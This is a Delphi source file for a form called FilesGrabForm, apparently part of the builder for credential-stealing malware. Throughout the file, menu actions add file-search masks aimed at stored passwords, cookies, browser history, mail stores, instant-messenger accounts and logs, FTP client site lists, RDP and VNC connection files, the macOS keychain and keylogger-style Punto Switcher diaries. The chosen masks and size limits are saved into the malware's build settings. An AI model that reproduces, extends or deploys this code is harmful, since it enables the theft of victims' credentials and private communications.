unit FilesGrabForm;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, Grids, ComCtrls, ExtCtrls, ActnList, Menus;

type
  TForm11 = class(TForm)
    actionlist1: tactionlist;
    ListBox3: TListBox;
    StringGrid1: Tstringgrid;
    combobox6: Tcombobox;
    edit5: tedit;
    edit6: tedit;
    edit11: tedit;
    combobox7: tcombobox;
    combobox3: tcombobox;
    bevel2: tbevel;
    bevel16: tbevel;
    bevel18: tbevel;
    label7: tlabel;
    label8: tlabel;
    label21: tlabel;
    label22: tlabel;
    button2: tbutton;
    button3: tbutton;
    button6: tbutton;
    button7: tbutton;
    button8: tbutton;
    button9: tbutton;
    Button1: TButton;
    PopupMenu1: TPopupMenu;
    IM1: TMenuItem;
    N1: TMenuItem;
    FTP1: TMenuItem;
    FileZilla1: TMenuItem;
    Mailru1: TMenuItem;
    Opera1: TMenuItem;
    Opera2: TMenuItem;
    otalCommander1: TMenuItem;
    QIP1: TMenuItem;
    MozillaFirefox1: TMenuItem;
    Opera3: TMenuItem;
    MozillaFireFox2: TMenuItem;
    MozillaFireFox3: TMenuItem;
    QIP2: TMenuItem;
    IE1: TMenuItem;
    IE2: TMenuItem;
    Misc1: TMenuItem;
    QIP2005history1: TMenuItem;
    QIP2005passwords1: TMenuItem;
    SelectAll1: TMenuItem;
    Action1: TAction;
    Action2: TAction;
    Action3: TAction;
    Action4: TAction;
    Action5: TAction;
    Action6: TAction;
    Action7: TAction;
    Action8: TAction;
    Action9: TAction;
    Action10: TAction;
    Action11: TAction;
    Action12: TAction;
    Action13: TAction;
    Action14: TAction;
    Action15: TAction;
    Action16: TAction;
    Pidgin1: TMenuItem;
    Pandion1: TMenuItem;
    Gaim1: TMenuItem;
    RQ1: TMenuItem;
    MicrosoftOutlook1: TMenuItem;
    Mail1: TMenuItem;
    heBat1: TMenuItem;
    Safari1: TMenuItem;
    Action17: TAction;
    Action18: TAction;
    Action19: TAction;
    Action20: TAction;
    Action21: TAction;
    Action22: TAction;
    Action23: TAction;
    RemoteDesktop1: TMenuItem;
    Action24: TAction;
    VNC1: TMenuItem;
    Action25: TAction;
    BitKinex1: TMenuItem;
    BulletProofFTP1: TMenuItem;
    CuteFTP1: TMenuItem;
    DirectoryOpus1: TMenuItem;
    FlashFXP1: TMenuItem;
    FreeFTP1: TMenuItem;
    FTPCommander1: TMenuItem;
    FTPRush1: TMenuItem;
    SmartFTP1: TMenuItem;
    urboFTP1: TMenuItem;
    Action26: TAction;
    Action27: TAction;
    Action28: TAction;
    Action29: TAction;
    Action30: TAction;
    Action31: TAction;
    Action32: TAction;
    Action33: TAction;
    Action34: TAction;
    Action35: TAction;
    N2: TMenuItem;
    PuntoSwitchersDiary1: TMenuItem;
    Action36: TAction;
    MozillaThunderbird1: TMenuItem;
    Action37: TAction;
    OperaMail1: TMenuItem;
    Action38: TAction;
    MailCommander1: TMenuItem;
    Safarihistory1: TMenuItem;
    Safaricookies1: TMenuItem;
    Action39: TAction;
    WSFTP1: TMenuItem;
    Action40: TAction;
    Action43: TAction;
    Action42: TAction;
    Action41: TAction;
    PopupMenu2: TPopupMenu;
    N3: TMenuItem;
    procedure FormDestroy(Sender: TObject);
    procedure N3Click(Sender: TObject);
    procedure N2Click(Sender: TObject);
    procedure Action35Execute(Sender: TObject);
    procedure urboFTP1Click(Sender: TObject);
    procedure Action34Execute(Sender: TObject);
    procedure SmartFTP1Click(Sender: TObject);
    procedure Action33Execute(Sender: TObject);
    procedure FTPRush1Click(Sender: TObject);
    procedure Action32Execute(Sender: TObject);
    procedure FTPCommander1Click(Sender: TObject);
    procedure Action31Execute(Sender: TObject);
    procedure FreeFTP1Click(Sender: TObject);
    procedure Action30Execute(Sender: TObject);
    procedure FlashFXP1Click(Sender: TObject);
    procedure Action29Execute(Sender: TObject);
    procedure DirectoryOpus1Click(Sender: TObject);
    procedure Action28Execute(Sender: TObject);
    procedure CuteFTP1Click(Sender: TObject);
    procedure Action27Execute(Sender: TObject);
    procedure BulletProofFTP1Click(Sender: TObject);
    procedure Action26Execute(Sender: TObject);
    procedure BitKinex1Click(Sender: TObject);
    procedure Action25Execute(Sender: TObject);
    procedure VNC1Click(Sender: TObject);
    procedure Action24Execute(Sender: TObject);
    procedure RemoteDesktop1Click(Sender: TObject);
    procedure Action23Execute(Sender: TObject);
    procedure Safari1Click(Sender: TObject);
    procedure Action22Execute(Sender: TObject);
    procedure heBat1Click(Sender: TObject);
    procedure Action21Execute(Sender: TObject);
    procedure MicrosoftOutlook1Click(Sender: TObject);
    procedure Action20Execute(Sender: TObject);
    procedure RQ1Click(Sender: TObject);
    procedure Action19Execute(Sender: TObject);
    procedure Gaim1Click(Sender: TObject);
    procedure Action18Execute(Sender: TObject);
    procedure Pandion1Click(Sender: TObject);
    procedure Action17Execute(Sender: TObject);
    procedure Pidgin1Click(Sender: TObject);
    procedure Action16Execute(Sender: TObject);
    procedure Action15Execute(Sender: TObject);
    procedure Action14Execute(Sender: TObject);
    procedure Action13Execute(Sender: TObject);
    procedure Action12Execute(Sender: TObject);
    procedure Action11Execute(Sender: TObject);
    procedure Action10Execute(Sender: TObject);
    procedure Action9Execute(Sender: TObject);
    procedure Action8Execute(Sender: TObject);
    procedure Action7Execute(Sender: TObject);
    procedure Action6Execute(Sender: TObject);
    procedure Action5Execute(Sender: TObject);
    procedure Action4Execute(Sender: TObject);
    procedure Action2Execute(Sender: TObject);
    procedure Action1Execute(Sender: TObject);
    procedure SelectAll1Click(Sender: TObject);
    procedure QIP2005passwords1Click(Sender: TObject);
    procedure QIP2005history1Click(Sender: TObject);
    procedure IE2Click(Sender: TObject);
    procedure IE1Click(Sender: TObject);
    procedure MozillaFireFox3Click(Sender: TObject);
    procedure QIP2Click(Sender: TObject);
    procedure MozillaFireFox2Click(Sender: TObject);
    procedure Opera3Click(Sender: TObject);
    procedure MozillaFirefox1Click(Sender: TObject);
    procedure QIP1Click(Sender: TObject);
    procedure otalCommander1Click(Sender: TObject);
    procedure Opera2Click(Sender: TObject);
    procedure Opera1Click(Sender: TObject);
    procedure Mailru1Click(Sender: TObject);
    procedure FileZilla1Click(Sender: TObject);
    procedure Action40Execute(Sender: TObject);
    procedure WSFTP1Click(Sender: TObject);
    procedure Action39Execute(Sender: TObject);
    procedure MailCommander1Click(Sender: TObject);
    procedure Action38Execute(Sender: TObject);
    procedure OperaMail1Click(Sender: TObject);
    procedure Action37Execute(Sender: TObject);
    procedure MozillaThunderbird1Click(Sender: TObject);
    procedure PuntoSwitchersDiary1Click(Sender: TObject);
    procedure Action36Execute(Sender: TObject);
    procedure Action43Execute(Sender: TObject);
    procedure Safaricookies1Click(Sender: TObject);
    procedure Action42Execute(Sender: TObject);
    procedure Safarihistory1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Button1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure StringGrid1KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure ListBox3KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure Button9Click(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure Button8Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button7Click(Sender: TObject);
    procedure InsertSearchMask(sg:TStringGrid;p0:string);
  private
    { Private declarations }
  public
    procedure DeleteRow(yourStringGrid: TStringGrid; ARow: Integer);
    function  checkexist(s:string; LSTZ: TStringGrid):bool;
  end;

var
  Form11: TForm11;

implementation

{$R *.dfm}

uses Unit3, Parser, VersionInfoEdit;

procedure TForm11.DeleteRow(yourStringGrid: TStringGrid; ARow: Integer);
var i: Integer;
begin
  with yourStringGrid do
  begin
    for i := ARow to RowCount-2 do
      Rows[i].Assign(Rows[i+1]);
    RowCount := RowCount - 1
  end;
end;

procedure TForm11.InsertSearchMask(sg:TStringGrid;p0:string);
var
  min, max: dword;
begin
  sg.Cells[0,sg.RowCount-1]:=p0; // mask

  case FilesGrabForm.Form11.combobox6.ItemIndex of
       0: min:=1;
       1: min:=1024;
       2: min:=1024*1024
  else
          min:=1024*1024*1024;
  end;
  min:=min*dword(strtoint(FilesGrabForm.Form11.edit5.text));
  sg.Cells[1,sg.RowCount-1]:=inttostr(min); // min

  case FilesGrabForm.Form11.combobox7.ItemIndex of
       0: max:=1;
       1: max:=1024;
       2: max:=1024*1024
  else
          max:=1024*1024*1024;
  end;
  max:=max*dword(strtoint(FilesGrabForm.Form11.edit6.text));
  sg.Cells[2,sg.RowCount-1]:=inttostr(max); // min

  sg.RowCount:=sg.RowCount+1;
end;

procedure TForm11.N2Click(Sender: TObject);
var
f:textfile;
s:string;
begin
if not unit3.Form3.opendialog2.execute then exit;
assignfile(f, unit3.Form3.opendialog2.FileName);
reset(f);
while not Eof(f) do
begin
  ReadLn(f,s);
  InsertSearchMask(StringGrid1,s);
end;
closefile(f);
end;

procedure TForm11.SelectAll1Click(Sender: TObject);
var
i:dword;
begin
for i:=0 to actionlist1.ActionCount-1 do
actionlist1.Actions[i].Execute;
end;

procedure TForm11.MozillaThunderbird1Click(Sender: TObject);
begin
actionlist1.Actions[36].Execute;
end;

procedure TForm11.Safarihistory1Click(Sender: TObject);
begin
actionlist1.Actions[41].Execute;
end;

procedure TForm11.Safaricookies1Click(Sender: TObject);
begin
actionlist1.Actions[42].Execute;
end;

procedure TForm11.OperaMail1Click(Sender: TObject);
begin
actionlist1.Actions[37].Execute;
end;

procedure TForm11.MailCommander1Click(Sender: TObject);
begin
actionlist1.Actions[38].Execute;
end;

procedure TForm11.WSFTP1Click(Sender: TObject);
begin
actionlist1.Actions[39].Execute;
end;

procedure TForm11.FileZilla1Click(Sender: TObject);
begin
actionlist1.Actions[3].Execute;
end;

procedure TForm11.Mailru1Click(Sender: TObject);
begin
actionlist1.Actions[4].Execute;
end;

procedure TForm11.Opera1Click(Sender: TObject);
begin
actionlist1.Actions[5].Execute;
end;

procedure TForm11.Opera2Click(Sender: TObject);
begin
actionlist1.Actions[6].Execute;
end;

procedure TForm11.otalCommander1Click(Sender: TObject);
begin
actionlist1.Actions[7].Execute;
end;

procedure TForm11.QIP1Click(Sender: TObject);
begin
actionlist1.Actions[8].Execute;
end;

procedure TForm11.MozillaFirefox1Click(Sender: TObject);
begin
actionlist1.Actions[9].Execute;
end;

procedure TForm11.Opera3Click(Sender: TObject);
begin
actionlist1.Actions[10].Execute;
end;

procedure TForm11.MozillaFireFox2Click(Sender: TObject);
begin
actionlist1.Actions[11].Execute;
end;

procedure TForm11.QIP2Click(Sender: TObject);
begin
actionlist1.Actions[12].Execute;
end;

procedure TForm11.MozillaFireFox3Click(Sender: TObject);
begin
actionlist1.Actions[13].Execute;
end;

procedure TForm11.IE1Click(Sender: TObject);
begin
actionlist1.Actions[14].Execute;
end;

procedure TForm11.IE2Click(Sender: TObject);
begin
actionlist1.Actions[15].Execute;
end;

procedure TForm11.QIP2005history1Click(Sender: TObject);
begin
actionlist1.Actions[1].Execute;
end;

procedure TForm11.QIP2005passwords1Click(Sender: TObject);
begin
actionlist1.Actions[0].Execute;
end;

procedure TForm11.Action2Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*QIP*\Users\*\History\*.txt');
end;

procedure TForm11.Action4Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\recentservers.xml');
end;

procedure TForm11.Action5Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\mra.dbs');
end;

procedure TForm11.Action6Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\wand.dat');
end;

procedure TForm11.Action7Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\global.dat');
end;

procedure TForm11.Action8Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\wcx_ftp.ini');
end;

procedure TForm11.Action9Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*.qip');
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*.bip');
end;

procedure TForm11.Action10Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\Mozilla\Firefox\Profiles\*\cookies.*');
end;

procedure TForm11.Action11Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\cookies4.dat');
end;

procedure TForm11.Action12Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\Mozilla\Firefox\Profiles\*\history.dat');
end;

procedure TForm11.Action13Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*.qhf');
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*.ahf');
end;

procedure TForm11.Action14Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*key3.db');
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*signons*.*');
end;

procedure TForm11.Action15Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\Cookies\*.txt');
end;

procedure TForm11.Action16Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*History\History.IE5\*.dat');
end;

procedure TForm11.Pidgin1Click(Sender: TObject);
begin
actionlist1.Actions[16].Execute;
end;

procedure TForm11.Action17Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\.purple\account.xml');
end;

procedure TForm11.Pandion1Click(Sender: TObject);
begin
actionlist1.Actions[17].Execute;
end;

procedure TForm11.Action18Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\global.xml');
end;

procedure TForm11.Gaim1Click(Sender: TObject);
begin
actionlist1.Actions[18].Execute;
end;

procedure TForm11.Action19Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\.gaim\account.xml');
end;

procedure TForm11.RQ1Click(Sender: TObject);
begin
actionlist1.Actions[19].Execute;
end;

procedure TForm11.Action20Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\andrq.ini');
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\randrq.ini');
end;

procedure TForm11.MicrosoftOutlook1Click(Sender: TObject);
begin
actionlist1.Actions[20].Execute;
end;

procedure TForm11.Action21Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*.pst');
end;

procedure TForm11.heBat1Click(Sender: TObject);
begin
actionlist1.Actions[21].Execute;
end;

procedure TForm11.Action22Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\account.cfg');
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\account.cfn');
end;

procedure TForm11.Safari1Click(Sender: TObject);
begin
actionlist1.Actions[22].Execute;
end;

procedure TForm11.Action23Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\keychain.plist');
end;

procedure TForm11.RemoteDesktop1Click(Sender: TObject);
begin
actionlist1.Actions[23].Execute;
end;

procedure TForm11.Action24Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*.rdp');
end;

procedure TForm11.VNC1Click(Sender: TObject);
begin
actionlist1.Actions[24].Execute;
end;

procedure TForm11.Action25Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*.vnc');
end;

procedure TForm11.BitKinex1Click(Sender: TObject);
begin
actionlist1.Actions[25].Execute;
end;

procedure TForm11.Action26Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*.ds');
end;

procedure TForm11.BulletProofFTP1Click(Sender: TObject);
begin
actionlist1.Actions[26].Execute;
end;

procedure TForm11.Action27Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\bpftp.dat');
end;

procedure TForm11.CuteFTP1Click(Sender: TObject);
begin
actionlist1.Actions[27].Execute;
end;

procedure TForm11.Action28Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\tree.dat');
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\sm.dat');
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\smdata.dat');
end;

procedure TForm11.DirectoryOpus1Click(Sender: TObject);
begin
actionlist1.Actions[28].Execute;
end;

procedure TForm11.Action29Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*.oxc');
end;

procedure TForm11.FlashFXP1Click(Sender: TObject);
begin
actionlist1.Actions[29].Execute;
end;

procedure TForm11.Action30Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\sites.dat');
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\quick.dat');
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\history.dat');
end;

procedure TForm11.FreeFTP1Click(Sender: TObject);
begin
actionlist1.Actions[30].Execute;
end;

procedure TForm11.Action37Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*.s');
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\signons.txt');
end;

procedure TForm11.Action38Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\accounts.ini');
end;

procedure TForm11.Action43Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\cookies.plist');
end;

procedure TForm11.Action42Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\history.plist');
end;

procedure TForm11.Action40Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\ws_ftp.ini');
end;

procedure TForm11.Action39Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\profiles.txt');
end;

procedure TForm11.Action31Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*.ccs');
end;

procedure TForm11.FTPCommander1Click(Sender: TObject);
begin
actionlist1.Actions[31].Execute;
end;

procedure TForm11.Action32Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\ftplist.txt');
end;

procedure TForm11.FTPRush1Click(Sender: TObject);
begin
actionlist1.Actions[32].Execute;
end;

procedure TForm11.Action33Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\RushSite.xml');
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\Sites.xml');
end;

procedure TForm11.SmartFTP1Click(Sender: TObject);
begin
actionlist1.Actions[33].Execute;
end;

procedure TForm11.Action34Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\History.dat');
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\Favorites.dat');
end;

procedure TForm11.urboFTP1Click(Sender: TObject);
begin
actionlist1.Actions[34].Execute;
end;

procedure TForm11.Action35Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*\addrbk.dat');
end;

procedure TForm11.PuntoSwitchersDiary1Click(Sender: TObject);
begin
actionlist1.Actions[35].Execute;
end;

procedure TForm11.Action36Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*punto?switcher*diary.dat');
end;

function TForm11.checkexist(s:string; LSTZ: TStringGrid):bool;
var
  i: dword;
  sgs:string;
begin
  if LSTZ.ColCount=1 then
     begin
       result:=false;
       exit;
     end;
  for i:=0 to LSTZ.ColCount-2 do
  begin
     sgs:=LSTZ.Cells[0,i];
     if lowercase(sgs) = lowercase(s) then
     begin
       result:=true;
       exit;
     end;
  end;
  result:=false;
end;

procedure TForm11.Button7Click(Sender: TObject);
var
min,max:dword;
begin
if combobox3.text<>'' then
    begin
      if not checkexist(combobox3.text, stringgrid1) then
      begin
            stringgrid1.Cells[0,stringgrid1.RowCount-1]:=combobox3.text;
            if edit5.Text='' then
              begin
                 MessageBox(application.Handle, pchar(err6t), pchar(err1c), MB_ICONWARNING);
                 exit;
              end;
            if edit6.Text='' then
              begin
                 MessageBox(application.Handle, pchar(err6t), pchar(err1c), MB_ICONWARNING);
                 exit;
              end;

            case combobox6.ItemIndex of
              0: min:=1;
              1: min:=1024;
              2: min:=1024*1024
            else
                 min:=1024*1024*1024;
            end;
            stringgrid1.Cells[1,stringgrid1.RowCount-1]:=inttostr(dword(strtoint(edit5.text))*min);

            case combobox7.ItemIndex of
              0: max:=1;
              1: max:=1024;
              2: max:=1024*1024
            else
                 max:=1024*1024*1024;
            end;
            stringgrid1.Cells[2,stringgrid1.RowCount-1]:=inttostr(dword(strtoint(edit6.text))*max);

            stringgrid1.RowCount:=stringgrid1.RowCount+1;
      end
      else
        MessageBox(application.Handle, pchar(err5t), pchar(err1c), MB_ICONWARNING);
    end
else
    MessageBox(application.Handle, pchar(err6t), pchar(err1c), MB_ICONWARNING);
end;

procedure TForm11.Button3Click(Sender: TObject);
begin
PopupMenu1.Popup(Mouse.CursorPos.X, Mouse.CursorPos.y);
end;

procedure TForm11.Button2Click(Sender: TObject);
begin
MessageBox(application.handle, pchar(m6), pchar(in_c), MB_ICONINFORMATION);
end;

procedure TForm11.Button8Click(Sender: TObject);
var
i:dword;
begin
for i:=0 to stringgrid1.RowCount-1 do
begin
  stringgrid1.Cells[0,i]:='';
  stringgrid1.Cells[1,i]:='';
  stringgrid1.Cells[2,i]:='';
end;
stringgrid1.RowCount:=1;
end;

procedure TForm11.Button6Click(Sender: TObject);
var
  i:dword;
begin
  if edit11.text='' then begin MessageBox(application.handle, pchar(err6t), pchar(err1c), MB_ICONINFORMATION); exit; end;
  if listbox3.Count=0 then begin listbox3.Items.Add(edit11.text); exit; end;
  for i:=0 to listbox3.Count-1 do
  begin
     if listbox3.Items[i]=edit11.Text then
     begin
       MessageBox(application.Handle, pchar(err5t), pchar(err1c), MB_ICONWARNING);
       exit;
     end;
  end;
  listbox3.Items.Add(edit11.text);
end;

procedure TForm11.Button9Click(Sender: TObject);
begin
listbox3.Clear;
end;

procedure TForm11.ListBox3KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
if (key=VK_DELETE) and (listbox3.ItemIndex<>-1) then listbox3.Items.Delete(listbox3.ItemIndex);
end;

procedure TForm11.StringGrid1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
if (key=VK_DELETE) and (stringgrid1.Row <> (stringgrid1.RowCount-1))
then DeleteRow(stringgrid1,stringgrid1.Row);
end;

procedure TForm11.FormCreate(Sender: TObject);
var
  i:integer;
begin
  stringgrid1.ColWidths[0]:=100;
  stringgrid1.ColWidths[1]:=70;
  stringgrid1.ColWidths[2]:=70;
  
  if bs.except_mask_fc>0 then
  for i:=0 to bs.except_mask_fc-1 do listbox3.Items.Add(bs.except_mask_strings[i]);

  if bs.files_grab_fc>0 then
  for i:=0 to bs.files_grab_fc-1 do
  begin
    stringgrid1.Cells[0,stringgrid1.RowCount-1]:=bs.files_grab_str[i];
    stringgrid1.Cells[1,stringgrid1.RowCount-1]:=inttostr(bs.files_grab_min[i]);
    stringgrid1.Cells[2,stringgrid1.RowCount-1]:=inttostr(bs.files_grab_max[i]);
    stringgrid1.RowCount:=stringgrid1.RowCount+1;
  end;
end;

procedure TForm11.Button1Click(Sender: TObject);
begin
  EnableWindow(unit3.Form3.Handle, true);
  BringWindowToTop(unit3.Form3.Handle);
  form11.Release;
end;

procedure TForm11.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  EnableWindow(unit3.Form3.Handle, true);
  BringWindowToTop(unit3.Form3.Handle);
  Action := caFree;
end;

procedure TForm11.Action1Execute(Sender: TObject);
begin
InsertSearchMask(FilesGrabForm.Form11.StringGrid1,'*QIP*\Users\*\Config.ini');
end;

procedure TForm11.N3Click(Sender: TObject);
begin
if stringgrid1.Row <> (stringgrid1.RowCount-1) then DeleteRow(stringgrid1,stringgrid1.Row);
end;

procedure TForm11.FormDestroy(Sender: TObject);
var
  i:integer;
begin
  bs.except_mask_fc:=listbox3.Items.Count;
  if listbox3.Items.Count>0 then
  for i:=0 to listbox3.Items.Count-1 do bs.except_mask_strings[i]:=listbox3.Items[i];

  bs.files_grab_fc:=stringgrid1.RowCount-1;
  if bs.files_grab_fc>0 then
  for i:=0 to bs.files_grab_fc-1 do
  begin
    bs.files_grab_str[i]:=stringgrid1.Cells[0,i];
    bs.files_grab_min[i]:=strtoint(stringgrid1.Cells[1,i]);
    bs.files_grab_max[i]:=strtoint(stringgrid1.Cells[2,i]);
  end;
end;

end.

